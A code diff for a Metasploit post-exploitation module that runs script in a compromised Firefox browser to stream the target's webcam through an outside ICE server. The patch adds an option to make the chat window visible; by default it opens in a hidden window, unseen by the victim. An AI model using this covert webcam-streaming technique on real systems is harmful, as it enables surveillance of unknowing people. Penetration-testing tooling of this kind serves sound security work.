@@ -24,6 +24,7 @@ class Metasploit3 < Msf::Post
 
     register_options([
       OptBool.new('CLOSE', [false, "Forcibly close previous chat session", false]),
+      OptBool.new('VISIBLE', [false, "Show a window containing the chat to the target", false]),
       OptInt.new('TIMEOUT', [false, "End the chat session after this many seconds", -1]),
       OptString.new('ICESERVER', [true, "The ICE server that sets up the P2P connection", 'wsnodejs.jit.su:80'])
     ], self.class)
@@ -66,6 +67,12 @@ class Metasploit3 < Msf::Post
       '"data:text/html;base64,"+html'
     end
 
+    name = if datastore['VISIBLE']
+      Rex::Text.rand_text_alphanumeric(10)
+    else
+      '_self'
+    end
+
     %Q|
       (function(send){
         try {
@@ -76,7 +83,7 @@ class Metasploit3 < Msf::Post
 
           var html = "#{Rex::Text.encode_base64(interface)}";
           var url = #{url};
-          AppShellService.hiddenDOMWindow.open(url, '_self');
+          AppShellService.hiddenDOMWindow.openDialog(url, '#{name}', 'chrome=1,width=1100,height=600');
           send("Streaming webcam...");
 
         } catch (e) {
